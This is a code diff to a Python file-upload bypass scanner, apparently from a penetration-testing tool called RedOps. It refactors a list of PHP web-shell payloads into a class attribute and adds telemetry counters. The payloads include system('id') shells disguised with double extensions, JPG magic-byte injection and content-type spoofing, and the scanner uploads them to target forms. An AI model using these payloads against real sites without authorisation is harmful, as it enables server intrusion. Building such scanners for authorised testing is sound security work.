@@ -3,6 +3,14 @@ import os
 import re
 
 class UploadExpertScanner:
+    PAYLOAD_TELEMETRY_KEYS = (
+        "payloads_planned",
+        "payloads_attempted",
+        "payloads_skipped",
+        "payloads_succeeded",
+        "payloads_errored",
+    )
+
     """
     Expert Auditor for File Upload Bypass.
     Tests extension blacklists, content-type spoofing, and Magic Byte injection.
@@ -18,6 +26,21 @@ class UploadExpertScanner:
             "png": b"\x89\x50\x4E\x47\x0D\x0A\x1A\x0A",
             "gif": b"GIF89a"
         }
+        self.attack_payloads = [
+            # 1. Simple PHP shell with JPG extension (if server only checks extension)
+            {"filename": "shell.php.jpg", "content": b"<?php system('id'); ?>", "type": "image/jpeg"},
+            # 2. Magic Byte Injection (JPG signature at start of PHP code)
+            {"filename": "magic_shell.php", "content": self.magic_bytes["jpg"] + b"<?php system('id'); ?>", "type": "image/jpeg"},
+            # 3. Double extension bypass
+            {"filename": "shell.php.png", "content": b"<?php phpinfo(); ?>", "type": "image/png"},
+            # 4. Content-Type Spoofing only
+            {"filename": "shell_spoof.php", "content": b"<?php echo 'RedOps3'; ?>", "type": "image/jpeg"}
+        ]
+        self.last_telemetry = self._new_payload_telemetry()
+
+    @classmethod
+    def _new_payload_telemetry(cls):
+        return {key: 0 for key in cls.PAYLOAD_TELEMETRY_KEYS}
 
     def _is_static_asset(self, url):
         """Check if URL points to a static asset that shouldn't handle uploads."""
@@ -35,26 +58,19 @@ class UploadExpertScanner:
 
     def scan_upload_form(self, action_url, file_param="file", logger=None):
         findings = []
+        telemetry = self._new_payload_telemetry()
+        telemetry["payloads_planned"] = len(self.attack_payloads)
         
         if self._is_static_asset(action_url):
+            telemetry["payloads_skipped"] = len(self.attack_payloads)
+            self.last_telemetry = telemetry
             if logger: logger(f"Upload Expert: Skipping static asset {action_url}", "DEBUG")
             return []
 
         if logger: logger(f"Upload Expert: Testing bypass on {action_url}...", "INFO")
 
-        # Attack Payloads
-        payloads = [
-            # 1. Simple PHP shell with JPG extension (if server only checks extension)
-            {"filename": "shell.php.jpg", "content": b"<?php system('id'); ?>", "type": "image/jpeg"},
-            # 2. Magic Byte Injection (JPG signature at start of PHP code)
-            {"filename": "magic_shell.php", "content": self.magic_bytes["jpg"] + b"<?php system('id'); ?>", "type": "image/jpeg"},
-            # 3. Double extension bypass
-            {"filename": "shell.php.png", "content": b"<?php phpinfo(); ?>", "type": "image/png"},
-            # 4. Content-Type Spoofing only
-            {"filename": "shell_spoof.php", "content": b"<?php echo 'RedOps3'; ?>", "type": "image/jpeg"}
-        ]
-
-        for p in payloads:
+        for p in self.attack_payloads:
+            telemetry["payloads_attempted"] += 1
             try:
                 files = {file_param: (p["filename"], p["content"], p["type"])}
                 # Test the upload
@@ -96,6 +112,7 @@ class UploadExpertScanner:
                         is_success = "ambiguous"
 
                 if is_success:
+                    telemetry["payloads_succeeded"] += 1
                     severity = "high" if is_success is True else "medium"
                     label = "Bypass Potential" if is_success is True else "Ambiguous Upload Behavior"
                     
@@ -123,6 +140,8 @@ class UploadExpertScanner:
                     })
                     if logger: logger(f"{severity.upper()}: Upload {label} at {action_url}", "WARN")
             except Exception:
+                telemetry["payloads_errored"] += 1
                 pass
         
+        self.last_telemetry = telemetry
         return findings
